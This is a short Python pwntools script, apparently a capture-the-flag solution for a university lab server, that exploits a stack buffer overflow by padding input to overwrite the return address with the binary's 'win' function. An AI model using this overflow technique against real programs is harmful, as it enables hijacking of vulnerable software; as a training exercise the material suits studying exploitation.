#!/bin/python3.11
from pwn import *

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9993)

elf = ELF("./bin")

buffer = 0xffffce00

eip = 0xffffce4c

offset = eip - buffer

payload = b"A" * offset + p32(elf.symbols['win'])


print(S.recvuntil("in.'\n"))
S.sendline(payload)
print(S.recvall())
